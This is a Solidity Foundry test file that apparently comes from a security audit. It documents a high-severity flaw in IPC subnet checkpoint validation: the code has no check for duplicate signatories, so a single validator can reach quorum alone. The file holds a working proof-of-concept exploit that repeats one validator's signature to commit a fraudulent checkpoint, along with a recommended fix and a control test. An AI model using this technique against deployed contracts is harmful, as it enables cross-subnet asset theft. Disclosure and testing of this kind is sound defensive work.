// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.23;

// =============================================================================
// VULNERABILITY ANALYSIS
// =============================================================================
//
// Title   : Missing Signature Duplication Check in `submitCheckpoint`
// Severity: High
// Target  : SubnetActorCheckpointingFacet.submitCheckpoint (L38)
//           LibMultisignatureChecker.isValidWeightedMultiSignature
//
// -----------------------------------------------------------------------------
// BACKGROUND
// -----------------------------------------------------------------------------
// Bottom-up checkpoints in the IPC subnet protocol must be co-signed by a
// quorum of active validators before they are committed to the gateway.
// The quorum is enforced via a weighted multi-signature scheme:
//
//   threshold = (totalActivePower * majorityPercentage) / 100
//
// A checkpoint is accepted only when the sum of the weights of all provided
// signatories meets or exceeds this threshold.
//
// -----------------------------------------------------------------------------
// ROOT CAUSE
// -----------------------------------------------------------------------------
// The vulnerability lies in `LibMultisignatureChecker.isValidWeightedMultiSignature`
// (contracts/lib/LibMultisignatureChecker.sol).  The function iterates over
// the caller-supplied `signatories` array and for each entry:
//   1. Recovers the signer address from `signatures[i]` via ECDSA.recover.
//   2. Checks that the recovered address equals `signatories[i]`.
//   3. Adds `weights[i]` to the running total.
//
// Critically, it performs NO uniqueness check on the elements of `signatories`.
// The same (address, signature) pair can therefore appear an arbitrary number
// of times in the input arrays.  Because `getTotalPowerOfValidators` also
// returns the same collateral value for each repeated occurrence of an address,
// the attacker's weight is multiplied by the number of duplicates.
//
// Vulnerable code path:
//
//   submitCheckpoint(checkpoint, signatories, signatures)
//     └─> validateActiveQuorumSignatures(signatories, hash, signatures)
//           └─> getTotalPowerOfValidators(signatories)   // duplicates counted N times
//               isValidWeightedMultiSignature(...)       // no uniqueness enforcement
//                 for i in range(len(signatories)):
//                   recovered = ECDSA.recover(hash, signatures[i])
//                   require(recovered == signatories[i]) // same addr accepted repeatedly
//                   weight += weights[i]                 // weight accumulates N times
//                 require(weight >= threshold)           // threshold met fraudulently
//
// -----------------------------------------------------------------------------
// IMPACT
// -----------------------------------------------------------------------------
// A single malicious validator (or a small colluding minority) can commit an
// arbitrary checkpoint to the gateway without the participation of the required
// majority.  Concretely, a validator whose collateral represents only W% of the
// total stake needs to repeat its entry ceil(threshold / W) times to pass the
// check.  Since the `signatories` and `signatures` arrays are caller-supplied
// calldata with no length cap beyond the block gas limit, the required number
// of duplicates is always achievable.
//
// Consequences include:
//   - Fraudulent bottom-up message execution (cross-subnet asset theft).
//   - Illegitimate validator-set configuration changes.
//   - Undermining the censorship-resistance and safety guarantees of the subnet.
//
// -----------------------------------------------------------------------------
// PROOF-OF-CONCEPT SCENARIO
// -----------------------------------------------------------------------------
// Validator set  : 4 validators, each with collateral = 10
// Total power    : 40
// majorityPct    : 70  =>  threshold = (40 * 70) / 100 = 28
// Attacker stake : 10  (25% of total; far below the 70% majority)
// Attack         : attacker repeats (address, signature) pair 3 times
//                  accumulated weight = 10 * 3 = 30 >= 28  => PASSES
// Honest signers : 0   (the other 3 validators never participate)
//
// -----------------------------------------------------------------------------
// RECOMMENDED FIX
// -----------------------------------------------------------------------------
// Add a uniqueness check inside `isValidWeightedMultiSignature` before
// accumulating a signatory's weight, for example:
//
//   // Pseudocode
//   mapping(address => bool) seen;
//   for (uint i; i < signatories.length; ++i) {
//       require(!seen[signatories[i]], "DuplicateSignatory()");
//       seen[signatories[i]] = true;
//       ...
//   }
//
// Alternatively, enforce ascending address ordering (i.e., require
// signatories[i] < signatories[i+1]) which also catches duplicates with O(1)
// extra state.
//
// Affected files:
//   contracts/contracts/subnet/SubnetActorCheckpointingFacet.sol  (L38)
//   contracts/contracts/lib/LibMultisignatureChecker.sol
//
// Run PoC:
//   forge test --match-test testPoCH01_DuplicateSignatureBypassesQuorum -vvv
// =============================================================================

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {IntegrationTestBase} from "../IntegrationTestBase.sol";
import {TestUtils} from "../helpers/TestUtils.sol";
import {ActivityHelper} from "../helpers/ActivityHelper.sol";
import {SubnetActorFacetsHelper} from "../helpers/SubnetActorFacetsHelper.sol";
import {GatewayFacetsHelper} from "../helpers/GatewayFacetsHelper.sol";

import {BottomUpCheckpoint, IpcEnvelope} from "../../contracts/structs/CrossNet.sol";
import {SubnetID} from "../../contracts/structs/Subnet.sol";
import {SubnetIDHelper} from "../../contracts/lib/SubnetIDHelper.sol";
import {SubnetActorDiamond} from "../../contracts/SubnetActorDiamond.sol";
import {GatewayDiamond} from "../../contracts/GatewayDiamond.sol";

contract PoCH01DuplicateSignatureTest is Test, IntegrationTestBase {
    using SubnetIDHelper for SubnetID;
    using SubnetActorFacetsHelper for SubnetActorDiamond;
    using GatewayFacetsHelper for GatewayDiamond;

    // -------------------------------------------------------------------------
    // Test constants
    // -------------------------------------------------------------------------

    // 4 validators x collateral 10 => totalActivePower = 40
    // threshold = (40 * 70) / 100 = 28
    // attacker repeats entry 3 times => 10 * 3 = 30 >= 28  (quorum bypassed)
    uint256 constant TOTAL_VALIDATORS = 4;
    uint256 constant COLLATERAL       = 10;
    uint256 constant DUPLICATE_COUNT  = 3;

    // Private keys whose derived Ethereum address is consistent between
    // Foundry's vm.addr() and TestUtils.deriveValidatorPubKeyBytes().
    // Keys 100, 200, 300, 400 are confirmed correct by the existing test suite.
    uint256 constant KEY_0 = 100;
    uint256 constant KEY_1 = 200;
    uint256 constant KEY_2 = 300;
    uint256 constant KEY_3 = 400;

    // -------------------------------------------------------------------------
    // setUp
    // -------------------------------------------------------------------------

    function setUp() public override {
        super.setUp();
    }

    // -------------------------------------------------------------------------
    // Internal helpers
    // Split into small functions to avoid the Solidity "stack too deep" error.
    // -------------------------------------------------------------------------

    // Registers all validators in the subnet actor and returns their private
    // keys and addresses.
    //
    // Design note: pubkeys MUST be pre-computed in a separate loop before any
    // vm.prank() call.  TestUtils.deriveValidatorPubKeyBytes() is declared
    // `public`, so the Solidity compiler emits an external CALL for it.  If
    // that call is evaluated as an argument expression after vm.prank() is set,
    // the external CALL consumes the active prank, causing msg.sender inside
    // join() to be the test contract rather than the intended validator address,
    // which triggers NotOwnerOfPublicKey().  Separating the pubkey computation
    // from the prank+join call avoids this pitfall.
    function _joinValidators()
        internal
        returns (uint256[] memory keys, address[] memory addrs)
    {
        keys  = new uint256[](TOTAL_VALIDATORS);
        addrs = new address[](TOTAL_VALIDATORS);

        keys[0] = KEY_0; keys[1] = KEY_1; keys[2] = KEY_2; keys[3] = KEY_3;

        // Pass 1: compute addresses and pubkeys without any active prank.
        bytes[] memory pubKeys = new bytes[](TOTAL_VALIDATORS);
        for (uint256 i = 0; i < TOTAL_VALIDATORS; i++) {
            addrs[i]   = vm.addr(keys[i]);
            pubKeys[i] = TestUtils.deriveValidatorPubKeyBytes(keys[i]);
            vm.deal(addrs[i], 1 ether);
        }

        // Pass 2: set prank immediately before join() with no intervening calls.
        for (uint256 i = 0; i < TOTAL_VALIDATORS; i++) {
            vm.prank(addrs[i]);
            saDiamond.manager().join{value: COLLATERAL}(pubKeys[i], COLLATERAL);
        }
    }

    // Registers the subnet actor with the gateway so that commitCheckpoint()
    // can be called during submitCheckpoint().
    function _registerSubnet() internal {
        vm.deal(address(saDiamond), 100 ether);
        vm.prank(address(saDiamond));
        gatewayDiamond.manager().register{
            value: DEFAULT_MIN_VALIDATOR_STAKE + TOTAL_VALIDATORS * DEFAULT_CROSS_MSG_FEE
        }(TOTAL_VALIDATORS * DEFAULT_CROSS_MSG_FEE, DEFAULT_MIN_VALIDATOR_STAKE);
    }

    // Constructs a well-formed BottomUpCheckpoint at the first expected epoch.
    function _buildCheckpoint() internal view returns (BottomUpCheckpoint memory cp) {
        SubnetID memory localID = saDiamond.getter().getParent().createSubnetId(address(saDiamond));
        cp = BottomUpCheckpoint({
            subnetID: localID,
            blockHeight: saDiamond.getter().bottomUpCheckPeriod(),
            blockHash: keccak256("block1"),
            nextConfigurationNumber: 0,
            msgs: new IpcEnvelope[](0),
            activity: ActivityHelper.newCompressedActivityRollup(1, 3, bytes32(uint256(0)))
        });
    }

    // Builds the attack arrays: the same (attacker address, signature) pair
    // repeated DUPLICATE_COUNT times.  Because isValidWeightedMultiSignature
    // never checks for duplicates, this fools the weight accumulator into
    // counting the attacker's collateral multiple times.
    function _buildDupArrays(uint256 attackerKey, bytes32 cpHash)
        internal
        pure
        returns (address[] memory signatories, bytes[] memory signatures)
    {
        address attacker = vm.addr(attackerKey);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, cpHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        signatories = new address[](DUPLICATE_COUNT);
        signatures  = new bytes[](DUPLICATE_COUNT);
        for (uint256 i = 0; i < DUPLICATE_COUNT; i++) {
            signatories[i] = attacker; // same address every iteration
            signatures[i]  = sig;     // same signature every iteration
        }
    }

    // Builds honest arrays: every validator signs exactly once.
    // Used by the control test to confirm that legitimate submissions still work.
    function _buildLegitArrays(uint256[] memory keys, bytes32 cpHash)
        internal
        pure
        returns (address[] memory signatories, bytes[] memory signatures)
    {
        signatories = new address[](TOTAL_VALIDATORS);
        signatures  = new bytes[](TOTAL_VALIDATORS);
        for (uint256 i = 0; i < TOTAL_VALIDATORS; i++) {
            signatories[i] = vm.addr(keys[i]);
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(keys[i], cpHash);
            signatures[i] = abi.encodePacked(r, s, v);
        }
    }

    // -------------------------------------------------------------------------
    // PoC: single validator bypasses the 70% quorum via duplicate signatures
    // -------------------------------------------------------------------------
    //
    // Expected result on UNPATCHED code : PASS (submitCheckpoint succeeds)
    // Expected result after the fix     : FAIL (submitCheckpoint reverts)
    function testPoCH01_DuplicateSignatureBypassesQuorum() public {
        // Step 1 - Set up the validator set (4 validators, collateral 10 each).
        (uint256[] memory keys, address[] memory addrs) = _joinValidators();

        // Step 2 - Register the subnet with the gateway.
        _registerSubnet();

        // Step 3 - Build the checkpoint and its keccak256 hash.
        BottomUpCheckpoint memory cp = _buildCheckpoint();
        bytes32 cpHash = keccak256(abi.encode(cp));

        // Step 4 - Print quorum parameters for readability.
        uint256 totalPower   = TOTAL_VALIDATORS * COLLATERAL; // 40
        uint256 threshold    = (totalPower * saDiamond.getter().majorityPercentage()) / 100; // 28
        uint256 attackWeight = COLLATERAL * DUPLICATE_COUNT;  // 30
        console.log("Total active power  :", totalPower);
        console.log("Quorum threshold    :", threshold);
        console.log("Attack weight       :", attackWeight);
        assertTrue(attackWeight >= threshold, "PoC setup error: attackWeight < threshold");

        // Step 5 - Build the malicious input: one (address, sig) pair duplicated 3x.
        //          Validators 1, 2, 3 are completely absent from the arrays.
        (address[] memory dupSignatories, bytes[] memory dupSignatures) =
            _buildDupArrays(keys[0], cpHash);

        // Step 6 - Submit the checkpoint.  On the vulnerable contract this
        //          succeeds even though only 1 out of 4 validators participated.
        console.log("Submitting checkpoint: 1 unique signer (duplicated 3x), 3 validators absent");
        vm.prank(addrs[0]);
        saDiamond.checkpointer().submitCheckpoint(cp, dupSignatories, dupSignatures);

        // Step 7 - Assert the checkpoint was committed, proving the attack worked.
        uint256 committed = saDiamond.getter().lastBottomUpCheckpointHeight();
        console.log("lastBottomUpCheckpointHeight:", committed);
        assertEq(
            committed,
            saDiamond.getter().bottomUpCheckPeriod(),
            "Checkpoint not committed - vulnerability may have been patched"
        );

        console.log(">>> PoC PASSED: 1/4 validators bypassed the 70% quorum via duplicate sigs");
    }

    // -------------------------------------------------------------------------
    // Control: honest multi-signature submission still works after the fix
    // -------------------------------------------------------------------------
    //
    // All 4 validators each sign once.  Total weight = 40 >= threshold 28.
    // This test confirms that the legitimate flow is unaffected.
    function testControl_LegitimateMultiSigStillWorks() public {
        (uint256[] memory keys, address[] memory addrs) = _joinValidators();
        _registerSubnet();

        BottomUpCheckpoint memory cp = _buildCheckpoint();
        bytes32 cpHash = keccak256(abi.encode(cp));

        // Each of the 4 validators signs exactly once (no duplicates).
        (address[] memory signatories, bytes[] memory signatures) =
            _buildLegitArrays(keys, cpHash);

        vm.prank(addrs[0]);
        saDiamond.checkpointer().submitCheckpoint(cp, signatories, signatures);

        assertEq(
            saDiamond.getter().lastBottomUpCheckpointHeight(),
            saDiamond.getter().bottomUpCheckPeriod(),
            "Control test failed: legitimate multi-sig was rejected"
        );
        console.log("Control test passed: legitimate multi-sig accepted.");
    }
}
